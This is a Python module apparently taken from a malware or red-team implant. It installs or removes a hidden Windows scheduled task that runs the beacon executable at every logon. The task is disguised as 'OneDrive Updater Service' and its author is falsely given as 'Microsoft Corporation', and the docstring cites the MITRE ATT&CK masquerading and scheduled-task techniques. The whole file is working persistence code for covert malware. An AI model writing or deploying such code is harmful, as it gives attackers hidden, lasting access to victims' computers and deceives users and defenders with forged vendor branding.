"""
Agent persistence module — installs/removes the scheduled task masquerading as OneDrive.
T1036.005: Masquerading: Match Legitimate Name
T1053.005: Scheduled Task/Job: Scheduled Task
"""
from __future__ import annotations

import subprocess
import sys
from pathlib import Path

TASK_NAME   = "OneDrive Updater Service"
TASK_AUTHOR = "Microsoft Corporation"
BEACON_EXE  = Path(sys.executable)


def _install() -> str:
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>{TASK_AUTHOR}</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Settings>
    <Hidden>true</Hidden>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{BEACON_EXE}</Command>
    </Exec>
  </Actions>
</Task>"""
    tmp = Path("C:/Windows/Temp/upd.xml")
    tmp.write_text(xml, encoding="utf-16")
    result = subprocess.run(
        ["schtasks", "/create", "/tn", TASK_NAME, "/xml", str(tmp), "/f"],
        capture_output=True, text=True,
    )
    tmp.unlink(missing_ok=True)
    return result.stdout + result.stderr


def _remove() -> str:
    result = subprocess.run(
        ["schtasks", "/delete", "/tn", TASK_NAME, "/f"],
        capture_output=True, text=True,
    )
    return result.stdout + result.stderr


def run(task: dict) -> str:
    action = task.get("action", "install")
    if action == "install":
        return _install()
    if action == "remove":
        return _remove()
    return f"unknown action: {action}"
